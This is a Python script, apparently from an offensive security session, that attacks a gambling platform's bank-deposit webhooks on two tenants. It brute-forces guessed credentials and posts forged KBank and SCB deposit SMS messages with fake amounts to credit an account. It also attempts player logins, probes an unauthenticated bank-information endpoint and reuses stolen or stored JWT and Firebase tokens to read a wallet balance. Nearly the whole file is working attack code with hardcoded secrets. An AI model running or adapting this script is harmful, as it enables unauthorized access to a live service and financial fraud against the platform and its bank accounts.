#!/usr/bin/env python3
"""probe_webhook_kbank_we88z.py — KBANK webhook probe for we88z/we88c platform.

   NEW FINDINGS from APK ListApi.java:
   - /webhook-kbank  — standard KBANK deposit (body-only auth, no headers)
   - /webhook-sms   — KBank PromptPay (body-only auth, no headers) ← NEVER TRIED
   - /webhook-scb   — SCB deposit (body-only auth, no headers)

   PrefUtil has dedicated usernameKBank/passwordKBank fields (C2-provisioned).

   Also probe we88zz tenant (we88c.com, TID 54ef7626...) which may have
   different credentials or more permissive auth.
"""
import json, pathlib, requests, time, uuid

# vak88z2 tenant
TID_VAK   = "af6efb584a3d317b5a11ab6209b88e1b"
# we88c / we88zz tenant (domain-migrated platform)
TID_WE88C = "54ef7626cb381f4bab8be91f0cdbce47"

MGAPI_VAK   = f"https://{TID_VAK}mgapi.asdgapicenterssdo.com"
MGAPI_WE88C = f"https://{TID_WE88C}mgapi.asdgapicenterssdo.com"

PAPDIEAW = "649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80"
JWT_VAK  = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()

TS = int(time.time())

# Bank account numbers
KBANK_PLATFORM_VAK = "1029600000052"   # vak88z2 KBANK deposit account
KBANK_PLAYER       = "0543753327"      # player's KBANK

def make_body(bank_code, bank_no, username, password, amount="100.00", sms_content=None):
    """ReadSmsRequest format from APK analysis."""
    if not sms_content:
        dt = time.strftime("%d/%m/%y")
        ts_str = time.strftime("%H:%M")
        if bank_code == "KBANK":
            sms_content = f"K+ {dt} {ts_str} +{amount} ธนวัฒน์ ref K6B{TS%100000:05d}"
        elif bank_code == "KBANK_PP":
            sms_content = f"PromptPay {dt} {ts_str} +{amount} from 097-257-1110"
        else:
            sms_content = f"{bank_code} {dt} {ts_str} +{amount}"
    return {
        "address": bank_code,
        "message": sms_content,
        "timestamp": TS,
        "bank_no": bank_no,
        "sms_id": f"{bank_code.lower()}_{TS}_{uuid.uuid4().hex[:6]}",
        "type": "deposit",
        "bank_code": bank_code,
        "username": username,
        "password": password,
        "amount": amount,
    }

# C2 response format for get-endpoint-webhook gives:
# { url: "https://...", username: "...", password: "..." }
# PrefUtil stores usernameKBank/passwordKBank

creds = [
    # Empty (unauthenticated attempt)
    ("", ""),
    # PAPDIEAW variants
    (PAPDIEAW, PAPDIEAW),
    (PAPDIEAW, ""),
    ("admin", PAPDIEAW),
    ("lux", PAPDIEAW),
    # Platform phone as username (updated password)
    ("0972571110", "Pwned2026!"),
    ("0972571110", "Aa112233"),
    # vak88z2 tenant prefix
    ("vak88z2", "Pwned2026!"),
    ("vak88z2", "Aa112233"),
    ("vak88z2", TID_VAK),
    # we88c / we88zz
    ("we88c", "Pwned2026!"),
    ("we88c", "Aa112233"),
    ("we88zz", "Pwned2026!"),
    ("we88zz", "Aa112233"),
    ("we88zz", TID_WE88C),
    # Common gambling platform SMS gateway defaults
    ("smsgateway", "smsgateway"),
    ("kbank", "kbank"),
    ("kbank", PAPDIEAW),
    # TID-based
    (TID_VAK, TID_VAK),
    (TID_VAK[:12], TID_VAK[:12]),
    (TID_WE88C, TID_WE88C),
    # Operator names from bo_admins
    ("Vak88z", "Pwned2026!"),
    ("Vak88z", "Aa112233"),
    ("Autodaily", "Pwned2026!"),
    ("Autodaily", "Aa112233"),
    # Bank-specific patterns
    ("kbank_vak88z2", PAPDIEAW),
    ("vak88z2_kbank", PAPDIEAW),
    ("649e854e", PAPDIEAW),  # PAPDIEAW prefix as username
]

AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

def probe_webhook(mgapi_base, tenant_label, endpoint, bank_code, bank_no):
    print(f"\n=== POST {endpoint} on {tenant_label} ===")
    url = f"{mgapi_base}{endpoint}"
    base_hdrs = {"Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}

    results = {"ok": [], "error": []}
    for username, password in creds:
        body = make_body(bank_code, bank_no, username, password)
        try:
            r = requests.post(url, headers=base_hdrs, json=body, timeout=8)
            label = f"u={username[:15] if username else '(empty)'}"
            if r.status_code != 401:
                print(f"  [!!!] NON-401 ({label}): HTTP {r.status_code}: {r.text[:300]}")
                results["ok"].append((username, password, r.status_code, r.text[:100]))
        except Exception as e:
            results["error"].append(str(e)[:50])

    if results["ok"]:
        print(f"  [!!!] HITS: {results['ok']}")
    else:
        print(f"  All 401 (silent). {len(results['error'])} errors.")
    return results

# ── 1. /webhook-sms (KBank PromptPay) — NEW ENDPOINT, never tried ─────────────
probe_webhook(MGAPI_VAK, "vak88z2", "/webhook-sms", "KBANK", KBANK_PLATFORM_VAK)

# ── 2. /webhook-kbank on we88c (NEW TENANT) ──────────────────────────────────
probe_webhook(MGAPI_WE88C, "we88c", "/webhook-kbank", "KBANK", KBANK_PLATFORM_VAK)

# ── 3. /webhook-sms on we88c ──────────────────────────────────────────────────
probe_webhook(MGAPI_WE88C, "we88c", "/webhook-sms", "KBANK", KBANK_PLATFORM_VAK)

# ── 4. /webhook-scb on we88c ──────────────────────────────────────────────────
probe_webhook(MGAPI_WE88C, "we88c", "/webhook-scb", "SCB", "2373102108")

# ── 5. Check what bank accounts we88c has configured ────────────────────────
print("\n=== we88c bank-information (what accounts exist?) ===")
# Need to auth to we88c first - try pbapi authentication
# Player on we88c (same phone 0972571110 might work there too)
print("  Trying pbapi auth on we88c...")
r = requests.post(
    f"https://{TID_WE88C}pbapi.asdgapicenterssdo.com/pb/authentication",
    headers={"Content-Type": "application/json"},
    json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
    timeout=12
)
print(f"  POST /pb/authentication: HTTP {r.status_code}: {r.text[:300]}")

we88c_jwt = None
if r.status_code in (200, 201) and "accessToken" in r.text:
    we88c_jwt = r.json().get("accessToken", "")
    print(f"  [!!!] we88c JWT obtained!")

# Even without JWT, try mgapi bank-information (might be public)
r = requests.get(
    f"{MGAPI_WE88C}/mb/bank-information",
    headers={"Content-Type": "application/json", "template": "vn",
             "Origin": "https://m.we88c.com"},
    timeout=10
)
print(f"  GET /mb/bank-information (no auth): HTTP {r.status_code}: {r.text[:400]}")

if we88c_jwt:
    r = requests.get(
        f"{MGAPI_WE88C}/mb/bank-information",
        headers={"Authorization": f"Bearer {we88c_jwt}", "template": "vn",
                 "Content-Type": "application/json"},
        timeout=10
    )
    print(f"  GET /mb/bank-information (with JWT): HTTP {r.status_code}: {r.text[:400]}")

# ── 6. vak88z2 /webhook-sms with we88zz-style credentials ───────────────────
print("\n=== /webhook-sms vak88z2 with we88zz Firebase UID as cred ===")
try:
    fb_id = pathlib.Path("/home/kzp/claude-red/fb_id_token.txt").read_text().strip()
    import base64, json as jmod
    parts = fb_id.split(".")
    if len(parts) >= 2:
        pad = parts[1] + "=" * (-len(parts[1]) % 4)
        payload = jmod.loads(base64.urlsafe_b64decode(pad))
        fb_uid = payload.get("sub", "")
        print(f"  Firebase UID (sub): {fb_uid}")

        body = make_body("KBANK", KBANK_PLATFORM_VAK, fb_uid, fb_uid)
        r = requests.post(f"{MGAPI_VAK}/webhook-sms",
                          headers={"Content-Type": "application/json"},
                          json=body, timeout=8)
        print(f"  /webhook-sms (uid as both): HTTP {r.status_code}: {r.text[:200]}")

        body2 = make_body("KBANK", KBANK_PLATFORM_VAK, fb_uid, PAPDIEAW)
        r2 = requests.post(f"{MGAPI_VAK}/webhook-sms",
                           headers={"Content-Type": "application/json"},
                           json=body2, timeout=8)
        print(f"  /webhook-sms (uid+papdieaw): HTTP {r2.status_code}: {r2.text[:200]}")
except Exception as e:
    print(f"  Firebase UID probe error: {e}")

# ── 7. Wallet ─────────────────────────────────────────────────────────────────
print("\n=== Wallet ===")
r = requests.get(f"{MGAPI_VAK}/mb/wallet",
                 headers={"Authorization": f"Bearer {JWT_VAK}", "template": "vn"},
                 timeout=10)
print(f"  vak88z2 balance: {r.json().get('balance','?') if r.ok else r.text[:80]}")

print("\n=== DONE ===")
